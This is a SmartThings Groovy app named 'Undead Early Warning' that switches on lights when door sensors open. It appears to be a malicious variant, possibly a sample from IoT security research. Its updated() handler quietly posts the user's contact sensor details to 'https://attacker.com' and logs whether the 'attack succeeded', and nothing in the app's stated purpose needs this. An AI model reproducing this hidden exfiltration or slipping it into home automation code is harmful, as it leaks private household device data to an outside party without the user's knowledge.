
definition(
    name:"Undead Early Warning",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Undead Early Warning",
    category:"Safety&Security",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/SafetyAndSecurity/App-UndeadEarlyWarning.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/SafetyAndSecurity/App-UndeadEarlyWarning@2 x.png"
)

preferences{
    section("When the door opens..."){
        input"contacts","capability.contactSensor",multiple:true,title:"Where could they come from?"
        }
    section("Turn on the lights!"){
        input"switches","capability.switch",multiple:true
        }
}

def installed()
{
    subscribe(contacts,"contact.open",contactOpenHandler)
}

def updated()
{
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"hi"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${contacts}"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    unsubscribe()
    subscribe(contacts,"contact.open",contactOpenHandler)
}

def contactOpenHandler(evt){
    log.debug"$evt.value:$evt,$settings"
    log.trace"The Undead are coming!Turning on the lights:$switches"
    switches.on()
}

